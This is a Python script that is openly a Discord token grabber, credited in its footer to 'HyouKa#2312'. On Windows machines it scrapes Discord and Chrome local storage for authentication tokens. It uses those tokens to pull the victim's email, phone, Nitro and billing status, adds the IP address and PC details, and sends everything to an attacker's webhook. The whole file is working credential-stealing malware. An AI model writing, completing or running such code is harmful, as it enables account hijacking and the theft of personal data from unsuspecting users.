import os
if os.name != "nt" :
    exit()
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
}

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    if token:
        headers.update({"Authorization": token})
    return headers

def getToken(path):
    path += "\\Local Storage\\leveldb"

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in findall(regex, line):
                    tokens.append(token)
                    
    return tokens 


def getip():
    ip = None
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers = getheaders(token))).read().decode())
    except:
        pass

def paymentMethod(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def getavatar(user_id, avatar_id):
    url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
    
def main():

    embeds = []
    pcUserName = os.getenv("UserName")
    pcName = os.getenv("COMPUTERNAME")
    ip = getip()
    token = ''
    alltoken = []
    avatar = ''
    email = ''
    nitro = ''
    billing = ''
    phoneNumber = ''
    result = ""
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        
        tokens = getToken(path)
        
        if len(tokens) > 0:
            for a in tokens:
                token += f'{a}\n'
    
        else:
            token += 'Not found'
        
        for token in getToken(path):
            alltoken.append(token)
            user_info = getuserdata(token)
            if not user_info:
                continue
            
            username = user_info["username"] + "#" + str(user_info["discriminator"])
            email = user_info.get("email")
            nitro = bool(user_info.get("premium_type"))
            billing = bool(paymentMethod(token))
            phoneNumber = user_info.get("Phone")
            user_id = user_info["id"]
            avatar_id = user_info["avatar"]
            avatar = getavatar(user_id, avatar_id)
    for k in alltoken:
        result += k + " 👨‍💻 " + "\n"
    embed = {
                "color": 0x000000,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phoneNumber}\nNitro: {nitro} \nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pcUserName}\nPC Name: {pcName} \nToken Location: {platform} ',
                        "inline": False
                    },
                    {
                        "name": "**New Account Info**",
                        "value": f'New MDP : None \nNew Email : None',
                        "inline": False
                    },
                    {
                        "name": "**All Token**",
                        "value": f'{result}',
                        "inline": False
                    }
                ],
                "author": {
                    "name": f'{username}',
                    "icon_url": f'{avatar}\n'
                },
                "footer": {
                    "text": f"Token grabber by HyouKa#2312"
                }
            }
    embeds.append(embed)
   
    webhook = {
        
        "content": "@everyone",
        "embeds": embeds,
        "username": "Token Grab",
        "avatar_url": "https://i.pinimg.com/564x/b8/65/3f/b8653ff51830c64a82f116b1a4ebc076.jpg"
        
    }

    try:
        urlopen(Request("WEBHOOK URL HERE", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
try:
    main()
except Exception as e:
    print(e)
    pass